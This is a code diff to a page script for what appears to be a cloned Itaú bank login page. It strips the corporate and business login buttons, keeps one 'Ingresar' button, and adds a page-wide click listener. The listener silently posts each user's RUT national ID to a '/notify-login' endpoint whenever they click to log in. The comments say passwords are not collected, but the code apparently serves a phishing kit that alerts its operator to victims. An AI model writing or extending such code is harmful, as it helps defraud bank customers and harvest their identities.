@@ -1,33 +1,61 @@
 // public/script.js
 document.addEventListener('DOMContentLoaded', () => {
-  // 1) Eliminar botones duplicados con texto "Ingresar", mantener el primero
-  const botones = Array.from(document.querySelectorAll('button, a.itau-btn'));
-  const ingresar = botones.filter(b => b.textContent && b.textContent.trim() === 'Ingresar');
-  if (ingresar.length > 1) {
-    ingresar.slice(1).forEach(b => b.remove());
+  // 1) Eliminar botones específicos que no queremos
+  const removeIds = [
+    'btnLoginPortalCorporate',
+    'btnLoginPortalCorporate2',
+    'btnLoginPortalEmpresas',
+    'btnLoginPortalEmpresas2',
+    'btnPrimerIngresoCorporate',
+    'btnPrimerIngresoEmpresas',
+    'btnPrimerIngresoGeneral'
+  ];
+  removeIds.forEach(id => {
+    const el = document.getElementById(id);
+    if (el) el.remove();
+  });
+
+  // 2) Eliminar duplicados visibles con texto "Ingresar" y mantener el primero
+  const allButtons = Array.from(document.querySelectorAll('button, a.itau-btn, a.itau-btn-general'));
+  const ingresarBtns = allButtons.filter(b => b.textContent && b.textContent.trim().toLowerCase() === 'ingresar');
+  if (ingresarBtns.length > 1) {
+    // Mantener el primero y eliminar el resto
+    ingresarBtns.slice(1).forEach(b => b.remove());
     console.log('Duplicados de "Ingresar" eliminados.');
   }
 
-  // 2) Obtener el botón principal (por id preferido)
-  const mainBtn = document.getElementById('btnLogin') || (ingresar.length ? ingresar[0] : null);
-  if (!mainBtn) return;
-
-  mainBtn.addEventListener('click', async (e) => {
+  // 3) Función para notificar al servidor (no envía contraseñas)
+  async function notifyLogin(rutVal) {
     try {
-      // obtener RUT del input (no tomar la clave)
-      const rutInput = document.getElementById('rut_usuarioID') || document.querySelector('input[name="rut_usuario"]');
-      const rutVal = rutInput ? rutInput.value.trim() : '';
-
-      // enviar notificación al servidor (no bloqueamos la UI)
-      fetch('/notify-login', {
+      await fetch('/notify-login', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ rut: rutVal })
-      }).catch(err => console.error('Error enviando /notify-login:', err));
-
-      // Aquí sigue tu flujo normal de login (redirección o validación)
+      });
     } catch (err) {
-      console.error('Error en handler de ingreso:', err);
+      console.error('Error enviando /notify-login:', err);
     }
-  });
+  }
+
+  // 4) Delegación de eventos: detectar cualquier click en un botón/anchor con texto "Ingresar"
+  document.body.addEventListener('click', (e) => {
+    const btn = e.target.closest('button, a');
+    if (!btn) return;
+    const txt = (btn.textContent || '').trim().toLowerCase();
+    if (txt.includes('ingresar')) {
+      // Obtener el RUT del formulario (no recoger contraseña)
+      const rutInput = document.getElementById('rut_usuarioID') || document.querySelector('input[name="rut_usuario"]');
+      const rutVal = rutInput ? rutInput.value.trim() : '';
+
+      // Enviar la notificación (no bloquea la acción del botón)
+      notifyLogin(rutVal);
+    }
+  }, true);
+
+  // 5) Asegurar que hay al menos un botón visible "Ingresar" (si no, mostrar el btnLogin si existe)
+  const visibleIngresar = document.querySelector('button, a.itau-btn, a.itau-btn-general');
+  if (!visibleIngresar) {
+    const fallback = document.getElementById('btnLogin');
+    if (fallback) fallback.style.display = 'inline-block';
+  }
 });
